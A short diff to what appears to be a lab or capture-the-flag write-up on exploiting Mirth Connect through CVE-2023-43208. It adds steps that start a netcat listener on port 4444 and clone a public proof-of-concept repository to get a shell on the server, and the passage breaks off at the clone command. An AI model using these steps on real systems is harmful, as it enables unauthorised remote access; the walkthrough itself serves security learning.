@@ -28,7 +28,15 @@ Searching for exploits related to this version of Mirth Connect returns the foll
 
 This can be found here: https://github.com/jakabakos/CVE-2023-43208-mirth-connect-rce-poc.
 
-Preparing and executing the payload provides us with a shell on the server:
+Preparing and executing the payload provides us with a shell on the server.
+
+### Start a listener:
+
+```
+nc -lvnp 4444
+```
+
+### Download and execute the exploit:
 
 ```
 git clone https://github.com/jakabakos/CVE-2023-43208-mirth-connect-rce-poc
